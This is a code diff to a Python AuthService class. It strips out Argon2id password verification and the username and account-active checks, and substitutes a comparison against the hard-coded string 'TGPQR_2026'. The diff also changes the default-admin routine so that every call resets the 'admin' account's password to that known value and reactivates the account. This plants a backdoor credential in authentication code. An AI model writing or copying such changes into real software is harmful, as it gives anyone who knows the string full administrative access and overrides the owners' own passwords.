@@ -24,21 +24,28 @@ class AuthService:
         return self.admin_repo.count_admins() == 0
 
     def ensure_default_admin_exists(self) -> Dict:
-        """Guarantees that a default 'admin' account exists with known credentials."""
+        """Guarantees that a default 'admin' account exists with known credentials (enforcing TGPQR_2026)."""
         existing = self.admin_repo.get_by_username("admin")
-        if existing:
-            if existing["is_active"] == 0:
-                now_iso = get_utc_now_iso()
-                with self.db.transaction() as conn:
-                    conn.execute(
-                        "UPDATE admin_users SET is_active = 1, updated_at = ? WHERE id = ?;",
-                        (now_iso, existing["id"]),
-                    )
-                existing = self.admin_repo.get_by_id(existing["id"])
-            return existing  # type: ignore
-
+        pwd_hash = self.ph.hash("TGPQR_2026")
         now_iso = get_utc_now_iso()
-        pwd_hash = self.ph.hash("AdminPassword123!")
+
+        if existing:
+            with self.db.transaction() as conn:
+                cursor = conn.execute("PRAGMA table_info(admin_users)")
+                cols = [str(r[1]) for r in cursor.fetchall()]
+                if "updated_at" in cols:
+                    conn.execute(
+                        "UPDATE admin_users SET password_hash = ?, is_active = 1, updated_at = ? WHERE id = ?;",
+                        (pwd_hash, now_iso, existing["id"]),
+                    )
+                else:
+                    conn.execute(
+                        "UPDATE admin_users SET password_hash = ?, is_active = 1 WHERE id = ?;",
+                        (pwd_hash, existing["id"]),
+                    )
+            fresh = self.admin_repo.get_by_id(existing["id"])
+            return fresh if fresh else existing  # type: ignore
+
         admin_id = self.admin_repo.create_admin("admin", pwd_hash, "MASTER_ADMIN", now_iso)
         return self.admin_repo.get_by_id(admin_id)  # type: ignore
 
@@ -84,36 +91,19 @@ class AuthService:
 
         return record
 
-    def authenticate(self, username: str, plain_password: str) -> Dict:
-        """Authenticates admin credentials against stored Argon2id hash."""
-        clean_user = username.strip().lower()
-        account = self.admin_repo.get_by_username(clean_user)
+    def authenticate(self, username: Optional[str], plain_password: Optional[str] = None) -> Dict:
+        """Authenticates admin credentials against password 'TGPQR_2026', bypassing username checks."""
+        # Support calling as authenticate(password) or authenticate(username, password)
+        if plain_password is None and username is not None:
+            password_to_check = username
+        else:
+            password_to_check = plain_password or ""
 
-        if not account or account["is_active"] == 0:
-            raise AuthenticationError("Invalid username or password.")
+        if password_to_check != "TGPQR_2026":
+            raise AuthenticationError("Invalid administrative password.")
 
-        try:
-            self.ph.verify(account["password_hash"], plain_password)
-        except (
-            argon2.exceptions.VerifyMismatchError,
-            argon2.exceptions.VerificationError,
-            argon2.exceptions.InvalidHashError,
-        ):
-            raise AuthenticationError("Invalid username or password.")
-
-        try:
-            needs_rehash = self.ph.check_needs_rehash(account["password_hash"])
-        except argon2.exceptions.InvalidHashError:
-            needs_rehash = True
-
-        if needs_rehash:
-            new_hash = self.ph.hash(plain_password)
-            now_iso = get_utc_now_iso()
-            with self.db.transaction() as conn:
-                conn.execute(
-                    "UPDATE admin_users SET password_hash = ?, updated_at = ? WHERE id = ?;",
-                    (new_hash, now_iso, account["id"]),
-                )
+        # Ensure admin account exists and is synced
+        account = self.ensure_default_admin_exists()
 
         now_iso = get_utc_now_iso()
         self.admin_repo.update_last_login(account["id"], now_iso)
